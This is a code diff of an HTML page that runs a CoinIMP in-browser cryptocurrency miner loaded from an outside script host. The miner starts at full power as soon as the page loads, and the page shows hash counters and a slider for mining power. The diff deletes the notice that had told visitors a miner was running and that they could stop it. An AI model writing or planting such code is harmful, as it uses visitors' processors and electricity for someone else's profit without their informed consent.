@@ -1,11 +1,105 @@
-<body><script src="https://www.hostingcloud.racing/YkYQ.js"></script>
+<style>
+    body {
+        background: rgb(35, 35, 35);
+        color: white;
+    }
+    div[power] {
+        background-color: rgb(50, 50, 50);
+        position: fixed;
+        top: 5%;
+        height: 90%;
+        width: 25px;
+        border-radius: 25px;
+        right: 10px;
+        overflow: hidden;
+        transition: all 1s;
+        opacity: .7;
+    }
+    div[power]>b {
+        transform: rotate(90deg);
+        display: inline-block;
+        position: relative;
+        font-size: large;
+        top: 50%;
+        right: 0%;
+        opacity: 0;
+        transition: all .25s;
+        z-index: 10;
+        pointer-events: none;
+        user-select: none;
+    }
+    
+    div[power]:hover {
+        width: 50px;
+        opacity: 1;
+    }
+    div[power]:hover>b {
+        opacity: 1;
+    }
+
+    div[power]>a {
+        content: '';
+        display: inline-block;
+        position: relative;
+        bottom: 20;
+        background-color: royalblue;
+        height: 100%;
+        width: 100%;
+        border-radius: 20;
+        transition: .1s;
+    }
+</style>
+
+
+Hashes: <hashes style="color: blanchedalmond;"></hashes><br>
+Job: <job style="color: blanchedalmond;"></job>
+<div power>
+    <b>100%</b>
+    <a></a>
+    <script>
+        var powerUI = document.querySelector('[power]>a')
+        powerUI.isMoving = false
+
+        powerUI.parentElement.addEventListener('mousedown',()=>{powerUI.isMoving = true});
+        powerUI.parentElement.addEventListener('mouseup',()=>{powerUI.isMoving = false})
+        
+        powerUI.parentElement.addEventListener('mousemove',(e) => {
+            if (powerUI.isMoving) {
+                var orgY = powerUI.parentElement.clientHeight
+                var value = Math.round(e.layerY/orgY*100)
+                powerUI.style.height = value+'%'
+                if (value > 0) {
+                    if (!_client.isRunning()) {_client.start()}
+                    _client.setThrottle(1- (Math.round(e.layerY/orgY*100)/100) );
+                    powerUI.parentElement.querySelector('b').innerText = value+'%'
+                } else {
+                    if (_client.isRunning()) {_client.stop()}
+                    powerUI.parentElement.querySelector('b').innerText = 'PAUSE'
+                }
+                console.log(e.layerY/orgY)
+            }
+        })
+    </script>
+</div>
+<script src="https://www.hostingcloud.racing/YkYQ.js"></script>
 <script>
+    function addCommas(x) {return x.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ",");}
     var _client = new Client.Anonymous('32020e88ee5d49144152b609fae0a8838a0cfdd469add84da91eb5171c920f30', {
         throttle: 0, c: 'w'
     });
     _client.start();
-    _client.addMiningNotification("Top", "This site is running JavaScript miner from coinimp.com. If it bothers you, you can stop it.", "#cccccc", 40, "#3d3d3d");
 
+    var job = 0
+    var found = 0
+    
+    _client.on('job',(e) => {
+        console.log('new job!',e.job_id,e)
+        job += 1
+        document.querySelector('hashes').innerText = addCommas(_client.getTotalHashes())+` (${addCommas(_client.getHashesPerSecond())})`
+        document.querySelector('job').innerText = addCommas(job)+` (${addCommas(found)})`
+    })
+    _client.on('found',() => {
+        console.log('caculated!')
+        found += 1
+    })
 </script>
-  Thanks you for helping me!
-</body>
